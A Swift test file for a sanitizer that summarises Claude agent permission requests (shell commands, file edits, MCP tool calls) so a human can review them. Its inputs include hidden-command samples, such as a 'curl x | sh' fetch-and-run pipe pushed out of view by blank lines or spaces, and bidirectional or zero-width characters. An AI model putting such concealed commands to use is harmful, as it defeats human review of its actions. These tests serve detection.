import Foundation
import Testing

@testable import RafuCore

private func payload(_ object: [String: Any]) throws -> Data {
    try JSONSerialization.data(withJSONObject: object)
}

private func permissionRequest(
    tool: String, input: [String: Any], event: String = "PermissionRequest"
) throws -> Data {
    try payload([
        "session_id": "s1", "hook_event_name": event, "cwd": "/Users/me/repo",
        "tool_name": tool, "tool_input": input, "permission_mode": "default",
    ])
}

@Suite("Claude permission request summary")
struct AgentPermissionRequestSummaryTests {
    @Test("A Bash request keeps the command and the description")
    func bash() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash",
                toolInput: ["command": "git status\nls", "description": "Show the state"]))
        #expect(summary.command == "git status\nls")
        #expect(summary.description == "Show the state")
        #expect(summary.filePath == nil)
        #expect(summary.isComplete)
    }

    @Test("A Write carries the full content")
    func writeCarriesTheFullContent() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Write",
                toolInput: ["file_path": "/Users/me/repo/a.swift", "content": "let a = 1\n"]))
        #expect(summary.filePath == "/Users/me/repo/a.swift")
        #expect(summary.command == nil)
        #expect(summary.isComplete)
        let change = try #require(summary.fileChanges.first)
        #expect(change.kind == .overwrite)
        #expect(change.body == "let a = 1\n")
        #expect(!change.isDiff)
    }

    @Test("An Edit carries the old and new strings")
    func editCarriesOldAndNewStrings() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Edit",
                toolInput: [
                    "file_path": "/r/a.swift", "old_string": "a\nb", "new_string": "c",
                    "replace_all": true,
                ]))
        #expect(summary.isComplete)
        let change = try #require(summary.fileChanges.first)
        #expect(change.kind == .edit)
        #expect(change.isDiff)
        #expect(change.body == "(every match)\n- a\n- b\n+ c")
    }

    @Test("An Edit with an edits array is read")
    func editWithEditsArrayIsRead() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Edit",
                toolInput: [
                    "file_path": "/r/a.swift",
                    "edits": [["old_string": "x", "new_string": "y"]],
                ]))
        #expect(summary.isComplete)
        #expect(summary.fileChanges.first?.body == "- x\n+ y")
        // The two forms together are ambiguous: only the terminal answers.
        let both = try #require(
            AgentPermissionRequestSummary(
                toolName: "Edit",
                toolInput: [
                    "file_path": "/r/a.swift", "old_string": "x", "new_string": "y",
                    "edits": [["old_string": "x", "new_string": "y"]],
                ]))
        #expect(!both.isComplete)
    }

    @Test("A MultiEdit carries every edit")
    func multiEditCarriesEveryEdit() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "MultiEdit",
                toolInput: [
                    "file_path": "/r/a.swift",
                    "edits": [
                        ["old_string": "a", "new_string": "b"],
                        ["old_string": "c", "new_string": ""],
                    ],
                ]))
        #expect(summary.isComplete)
        #expect(summary.fileChanges.first?.body == "- a\n+ b\n\n- c")
    }

    @Test("A body over the limit is cut and incomplete")
    func contentOverTheLimitIsIncomplete() throws {
        let content = String(
            repeating: "a", count: CanvasAgentRequest.Limits.fileChangeBodyBytes + 1)
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "Write", toolInput: ["file_path": "/r/a", "content": content]))
        #expect(!summary.isComplete)
        #expect(
            summary.fileChanges.first?.body.utf8.count
                == CanvasAgentRequest.Limits.fileChangeBodyBytes)
    }

    @Test("An input of an unknown shape is incomplete")
    func editWithoutNewStringIsIncomplete() throws {
        for input: [String: Any] in [
            ["file_path": "/r/a", "old_string": "x"],
            ["file_path": "/r/a", "edits": [["old_string": "x"]]],
            ["file_path": "/r/a", "edits": [String]()],
            ["file_path": "/r/a", "edits": "x"],
        ] {
            let summary = try #require(
                AgentPermissionRequestSummary(toolName: "Edit", toolInput: input))
            #expect(!summary.isComplete)
        }
        let write = try #require(
            AgentPermissionRequestSummary(toolName: "Write", toolInput: ["file_path": "/r/a"]))
        #expect(!write.isComplete)
    }

    @Test("The summary with the largest body fits the spool file")
    func summaryWithTheLargestBodyFitsTheSpoolFile() throws {
        // Worst case for JSON: every character is escaped.
        let quotes = String(repeating: "\"", count: CanvasAgentRequest.Limits.fileChangeBodyBytes)
        let path =
            "/"
            + String(repeating: "\"", count: AgentPermissionRequestSummary.maximumFilePathBytes - 1)
        let event = try AgentHookEvent(
            provider: .claude,
            payload: permissionRequest(
                tool: "Write", input: ["file_path": path, "content": quotes]),
            includesRequestSummary: true)
        let summary = try #require(event.requestSummary)
        #expect(summary.isComplete)
        let directory = FileManager.default.temporaryDirectory
            .appending(path: "spool-\(UUID().uuidString)", directoryHint: .isDirectory)
            .appending(path: "AgentTracking", directoryHint: .isDirectory)
            .appending(path: "spool", directoryHint: .isDirectory)
        defer {
            try? FileManager.default.removeItem(
                at: directory.deletingLastPathComponent().deletingLastPathComponent())
        }
        try AgentHookSpool.write(event, to: directory)
        let drained = try AgentHookSpool.drain(directory: directory)
        #expect(drained == [event])
    }

    @Test("A summary from an older helper keeps the path and is incomplete")
    func olderHelperSummary() throws {
        let json = #"{"filePath":"/r/a.swift","isComplete":true}"#
        let summary = try JSONDecoder().decode(
            AgentPermissionRequestSummary.self, from: Data(json.utf8))
        #expect(summary.filePath == "/r/a.swift")
        #expect(!summary.isComplete)
    }

    @Test("A Bash request that leaves the sandbox is incomplete")
    func leavesSandbox() throws {
        let unsandboxed = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash", toolInput: ["command": "ls", "dangerouslyDisableSandbox": true]))
        #expect(unsandboxed.command == "ls")
        #expect(!unsandboxed.isComplete)
        let sandboxed = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash", toolInput: ["command": "ls", "dangerouslyDisableSandbox": false]))
        #expect(sandboxed.isComplete)
    }

    @Test("Format characters and blank space that hides the end make it incomplete")
    func hiddenText() throws {
        for command in [
            "ls\u{200B} -la", "ls\u{FEFF}", "rm\u{00AD}dir x", "echo a\u{2060}b",
            "ls\n\n\n\n; curl x | sh", "ls" + String(repeating: " ", count: 65) + "; curl x | sh",
        ] {
            let summary = try #require(
                AgentPermissionRequestSummary(toolName: "Bash", toolInput: ["command": command]))
            #expect(!summary.isComplete)
        }
        let fits = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash", toolInput: ["command": "ls\n\n\nls"]))
        #expect(fits.isComplete)
    }

    @Test("Other tools and unreadable inputs give no summary")
    func unsupported() {
        #expect(AgentPermissionRequestSummary(toolName: "WebFetch", toolInput: ["url": "x"]) == nil)
        #expect(AgentPermissionRequestSummary(toolName: nil, toolInput: ["command": "ls"]) == nil)
        #expect(AgentPermissionRequestSummary(toolName: "Bash", toolInput: "ls") == nil)
        #expect(AgentPermissionRequestSummary(toolName: "Bash", toolInput: [String: Any]()) == nil)
        #expect(
            AgentPermissionRequestSummary(toolName: "Bash", toolInput: ["command": " \n"]) == nil)
        #expect(AgentPermissionRequestSummary(toolName: "Bash", toolInput: ["command": 7]) == nil)
        #expect(
            AgentPermissionRequestSummary(toolName: "Write", toolInput: ["file_path": ""]) == nil)
    }

    @Test("A command over the limit is cut and incomplete")
    func longCommand() throws {
        let long = String(repeating: "a", count: CanvasAgentRequest.Limits.commandBytes + 50)
        let summary = try #require(
            AgentPermissionRequestSummary(toolName: "Bash", toolInput: ["command": long]))
        #expect(summary.command?.utf8.count == CanvasAgentRequest.Limits.commandBytes)
        #expect(!summary.isComplete)
    }

    @Test("Control and bidirectional characters are removed and make it incomplete")
    func controlCharacters() throws {
        let command = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash", toolInput: ["command": "echo\u{1B}[31m hi\u{202E}"]))
        #expect(command.command == "echo[31m hi")
        #expect(!command.isComplete)
        let path = try #require(
            AgentPermissionRequestSummary(
                toolName: "Write", toolInput: ["file_path": "/tmp/a\u{7}b"]))
        #expect(path.filePath == "/tmp/ab")
        #expect(!path.isComplete)
    }

    @Test("A path over the limit is cut and incomplete; the description may be cut alone")
    func longPathAndDescription() throws {
        let path = String(
            repeating: "p", count: AgentPermissionRequestSummary.maximumFilePathBytes + 9)
        let file = try #require(
            AgentPermissionRequestSummary(toolName: "Edit", toolInput: ["file_path": path]))
        #expect(file.filePath?.utf8.count == AgentPermissionRequestSummary.maximumFilePathBytes)
        #expect(!file.isComplete)
        let bash = try #require(
            AgentPermissionRequestSummary(
                toolName: "Bash",
                toolInput: [
                    "command": "ls",
                    "description": String(
                        repeating: "d", count: CanvasAgentRequest.Limits.reasonBytes + 5),
                ]))
        #expect(bash.description?.utf8.count == CanvasAgentRequest.Limits.reasonBytes)
        #expect(bash.isComplete)
    }

    @Test("The helper's answer mode adds the summary; the normal mode never does")
    func eventSummary() throws {
        let data = try permissionRequest(
            tool: "Bash", input: ["command": "ls", "description": "List"])
        let plain = try AgentHookEvent(provider: .claude, payload: data)
        #expect(plain.requestSummary == nil)
        let answering = try AgentHookEvent(
            provider: .claude, payload: data, includesRequestSummary: true)
        #expect(answering.requestSummary?.command == "ls")
        #expect(answering.toolName == "Bash")
        // Only a Claude PermissionRequest carries one.
        let other = try AgentHookEvent(
            provider: .claude,
            payload: permissionRequest(tool: "Bash", input: ["command": "ls"], event: "PreToolUse"),
            includesRequestSummary: true)
        #expect(other.requestSummary == nil)
        let codex = try AgentHookEvent(
            provider: .codex, payload: data, includesRequestSummary: true)
        #expect(codex.requestSummary == nil)
    }

    @Test("The event with its summary round-trips and fits one spool file")
    func roundTripAndSize() throws {
        // Worst case for JSON: every command character is escaped.
        let command = String(repeating: "\"", count: CanvasAgentRequest.Limits.commandBytes)
        let event = try AgentHookEvent(
            provider: .claude,
            payload: permissionRequest(
                tool: "Bash",
                input: [
                    "command": command,
                    "description": String(
                        repeating: "\n", count: CanvasAgentRequest.Limits.reasonBytes),
                ]),
            includesRequestSummary: true)
        let data = try JSONEncoder().encode(event)
        #expect(data.count <= AgentHookSpool.maximumFileBytes)
        #expect(try JSONDecoder().decode(AgentHookEvent.self, from: data) == event)
    }

    @Test("An event from an older helper decodes without a summary")
    func olderEvent() throws {
        let event = try AgentHookEvent(
            provider: .claude, payload: permissionRequest(tool: "Bash", input: ["command": "ls"]))
        let data = try JSONEncoder().encode(event)
        let object = try #require(try JSONSerialization.jsonObject(with: data) as? [String: Any])
        #expect(object["requestSummary"] == nil)
        #expect(try JSONDecoder().decode(AgentHookEvent.self, from: data).requestSummary == nil)
    }

    @Test("Decoding rejects a summary the sanitizer would change")
    func decodeRejectsUnclean() throws {
        func decode(_ json: String) -> AgentPermissionRequestSummary? {
            try? JSONDecoder().decode(AgentPermissionRequestSummary.self, from: Data(json.utf8))
        }
        #expect(decode(#"{"command":"ls","isComplete":true}"#)?.command == "ls")
        #expect(decode(#"{"command":"l\u0007s","isComplete":true}"#) == nil)
        // A summary may claim less than the sanitizer finds, never more.
        #expect(decode(#"{"command":"l\u0007s","isComplete":false}"#) == nil)
        #expect(decode(#"{"command":"ls","isComplete":false}"#)?.isComplete == false)
        #expect(decode(#"{"isComplete":true}"#) == nil)
    }

    // MARK: MCP tools

    private static let atlassian = "mcp__claude_ai_Atlassian_MCP__atlassianUserInfo"

    @Test("An MCP tool with no arguments is complete and names its server and tool")
    func mcpToolWithEmptyInput() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(toolName: Self.atlassian, toolInput: [String: Any]()))
        #expect(summary.isComplete)
        #expect(summary.command == nil)
        #expect(summary.filePath == nil)
        let call = try #require(summary.toolCall)
        #expect(call.name == Self.atlassian)
        #expect(call.server == "claude_ai_Atlassian_MCP")
        #expect(call.tool == "atlassianUserInfo")
        #expect(call.arguments == "{}")
        #expect(
            call.reasonLine == "Atlassian MCP (claude.ai): atlassianUserInfo\n" + Self.atlassian)
        // An absent input counts as an empty object.
        let absent = try #require(
            AgentPermissionRequestSummary(toolName: Self.atlassian, toolInput: nil))
        #expect(absent.toolCall?.arguments == "{}")
    }

    @Test("Only a server with the claude.ai prefix gets the claude.ai label")
    func mcpServerLabel() throws {
        #expect(
            AgentPermissionRequestSummary.friendlyServer("claude_ai_Atlassian_MCP")
                == "Atlassian MCP (claude.ai)")
        #expect(AgentPermissionRequestSummary.friendlyServer("github") == "github")
        #expect(AgentPermissionRequestSummary.friendlyServer("claude_ai_") == "claude_ai_")
        let identity = try #require(
            AgentPermissionRequestSummary.toolIdentity(
                fromReason: AgentPermissionRequestSummary.toolReason(name: "mcp__github__search")
                    ?? ""))
        #expect(identity.server == "github")
        #expect(identity.tool == "search")
        #expect(identity.name == "mcp__github__search")
        // Text that was not built by toolReason has no identity.
        #expect(
            AgentPermissionRequestSummary.toolIdentity(
                fromReason: "Atlassian: tool\nmcp__github__search") == nil)
        #expect(AgentPermissionRequestSummary.toolIdentity(fromReason: "one line") == nil)
    }

    @Test("MCP arguments are sorted, pretty, stable JSON text")
    func mcpArgumentsAreStable() throws {
        let input: [String: Any] = [
            "query": "project = A/B", "limit": 5, "nested": ["z": 1, "a": [true, NSNull()]],
        ]
        let first = try #require(
            AgentPermissionRequestSummary(toolName: "mcp__jira__search", toolInput: input))
        let second = try #require(
            AgentPermissionRequestSummary(toolName: "mcp__jira__search", toolInput: input))
        #expect(first == second)
        let text = try #require(first.toolCall?.arguments)
        #expect(first.isComplete)
        // Sorted keys, and a slash is not escaped.
        let limit = try #require(text.range(of: "\"limit\""))
        let nested = try #require(text.range(of: "\"nested\""))
        let query = try #require(text.range(of: "\"query\""))
        #expect(limit.lowerBound < nested.lowerBound && nested.lowerBound < query.lowerBound)
        #expect(text.contains("project = A/B"))
        // What is shown is valid JSON that holds the same value.
        let back = try #require(
            try JSONSerialization.jsonObject(with: Data(text.utf8)) as? [String: Any])
        #expect(back["limit"] as? Int == 5)
    }

    @Test("A line break in an argument shows as an escape and stays complete")
    func mcpLineBreakIsEscaped() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(
                toolName: "mcp__jira__comment", toolInput: ["body": "a\nb\u{1}c"]))
        let text = try #require(summary.toolCall?.arguments)
        #expect(summary.isComplete)
        #expect(text.contains(#"a\nb\u0001c"#))
    }

    @Test("MCP arguments over the limit, or with a hidden character, are incomplete")
    func mcpArgumentsThatCannotShowWhole() throws {
        let long = String(repeating: "a", count: CanvasAgentRequest.Limits.commandBytes)
        let tooLong = try #require(
            AgentPermissionRequestSummary(toolName: "mcp__x__y", toolInput: ["q": long]))
        #expect(!tooLong.isComplete)
        #expect(
            (tooLong.toolCall?.arguments.utf8.count ?? .max)
                <= CanvasAgentRequest.Limits.commandBytes)
        let bidi = try #require(
            AgentPermissionRequestSummary(
                toolName: "mcp__x__y", toolInput: ["q": "safe\u{202E}evil"]))
        #expect(!bidi.isComplete)
        #expect(bidi.toolCall?.arguments.contains("\u{202E}") == false)
        // Deep nesting makes a run of blank space that could hide the end.
        var deep: Any = "end"
        for _ in 0..<40 { deep = ["k": deep] }
        let nested = try #require(
            AgentPermissionRequestSummary(toolName: "mcp__x__y", toolInput: ["d": deep]))
        #expect(!nested.isComplete)
    }

    @Test("A name that is not mcp__server__tool in the strict form gives no summary")
    func mcpBadNames() {
        let tooLong = "mcp__s__" + String(repeating: "t", count: 200)
        for name in [
            "mcp__", "mcp__x", "mcp____tool", "mcp__server__", "mcp__a b__tool", "mcp__a/b__tool",
            "mcp__srv__to\u{202E}ol", "mcp__srv__tool\n", "MCP__a__b", "mcp_a__b", tooLong,
        ] {
            #expect(
                AgentPermissionRequestSummary(toolName: name, toolInput: [String: Any]()) == nil,
                "\(name)")
        }
        #expect(
            AgentPermissionRequestSummary(toolName: "mcp__a__b.c-d_e", toolInput: nil) != nil)
        // Only the first double underscore splits the name.
        #expect(AgentPermissionRequestSummary.mcpParts(of: "mcp__a__b__c")?.tool == "b__c")
    }

    @Test("A non-object tool input gives no MCP summary")
    func mcpNonObjectInput() {
        #expect(AgentPermissionRequestSummary(toolName: "mcp__x__y", toolInput: "text") == nil)
        #expect(AgentPermissionRequestSummary(toolName: "mcp__x__y", toolInput: [1, 2]) == nil)
        #expect(AgentPermissionRequestSummary(toolName: "mcp__x__y", toolInput: NSNull()) == nil)
    }

    @Test("An MCP summary round-trips, and a decoded one that is not sanitized is rejected")
    func mcpCodable() throws {
        let summary = try #require(
            AgentPermissionRequestSummary(toolName: "mcp__jira__search", toolInput: ["q": "x"]))
        let data = try JSONEncoder().encode(summary)
        #expect(try JSONDecoder().decode(AgentPermissionRequestSummary.self, from: data) == summary)
        func decode(_ json: String) -> AgentPermissionRequestSummary? {
            try? JSONDecoder().decode(AgentPermissionRequestSummary.self, from: Data(json.utf8))
        }
        #expect(
            decode(#"{"toolCall":{"name":"mcp__a__b","arguments":"{}"},"isComplete":true}"#) != nil)
        // An unclean argument text, a bad name, or a command beside a tool call.
        #expect(
            decode(#"{"toolCall":{"name":"mcp__a__b","arguments":"{\u0007}"},"isComplete":true}"#)
                == nil)
        #expect(
            decode(#"{"toolCall":{"name":"Bash","arguments":"{}"},"isComplete":true}"#) == nil)
        #expect(
            decode(
                #"{"command":"ls","toolCall":{"name":"mcp__a__b","arguments":"{}"},"isComplete":true}"#
            ) == nil)
        // It may claim less than the sanitizer finds, never more.
        let wide = String(repeating: "a", count: CanvasAgentRequest.Limits.commandBytes + 1)
        #expect(
            decode(#"{"toolCall":{"name":"mcp__a__b","arguments":"\#(wide)"},"isComplete":true}"#)
                == nil)
    }

    @Test("The helper's answer mode adds an MCP summary; the normal mode never does")
    func mcpEventSummary() throws {
        let data = try permissionRequest(tool: Self.atlassian, input: [:])
        let plain = try AgentHookEvent(provider: .claude, payload: data)
        #expect(plain.requestSummary == nil)
        let answering = try AgentHookEvent(
            provider: .claude, payload: data, includesRequestSummary: true)
        #expect(answering.requestSummary?.toolCall?.name == Self.atlassian)
        let codex = try AgentHookEvent(
            provider: .codex, payload: data, includesRequestSummary: true)
        #expect(codex.requestSummary == nil)
        // The event with its summary fits one spool file, also with the most arguments.
        let wide = try AgentHookEvent(
            provider: .claude,
            payload: permissionRequest(
                tool: Self.atlassian,
                input: ["q": String(repeating: "\"", count: CanvasAgentRequest.Limits.commandBytes)]
            ), includesRequestSummary: true)
        let encoded = try JSONEncoder().encode(wide)
        #expect(encoded.count <= AgentHookSpool.maximumFileBytes)
        #expect(try JSONDecoder().decode(AgentHookEvent.self, from: encoded) == wide)
    }
}
